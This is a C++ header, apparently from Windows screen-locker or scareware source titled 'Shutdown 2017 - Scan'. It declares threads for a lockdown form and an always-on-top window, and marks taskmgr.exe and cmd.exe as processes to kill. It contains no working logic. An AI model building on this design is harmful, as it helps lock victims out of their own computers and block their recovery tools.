#include									<Windows.h>
#include									<tlhelp32.h>
#include									<string>

extern HANDLE								h_frm_thread;
extern HANDLE								h_frm_top_thread;
extern DWORD								dw_frm_top_thread;
extern DWORD								dw_frm_thread;
extern DWORD WINAPI							t_showLockdownForm(LPVOID lpParameter);
extern DWORD WINAPI							t_alwaysOnTop(LPVOID lpParameter);
extern bool									b_scan_status;

#define	WINDOW_NAME							L"Shutdown 2017 - Scan"
#define										CMD_KILL
#define										TASK_MANAGER_KILL

#ifdef	TASK_MANAGER_KILL
	#define	SCREEN_LOCK_TSKMGR				L"taskmgr.exe"
#endif

#ifdef CMD_KILL
	#define	SCREEN_LOCK_CMD					L"cmd.exe"
#endif

#define START_FORM_THREAD()					{h_frm_thread = CreateThread(0, 0, &t_showLockdownForm, 0, 0, &dw_frm_thread);}
#define START_FORM_TOP_THREAD()				{h_frm_top_thread = CreateThread(0, 0, &t_alwaysOnTop, 0, 0, &dw_frm_top_thread);}

#define FORM_SCAN_STATUS					b_scan_status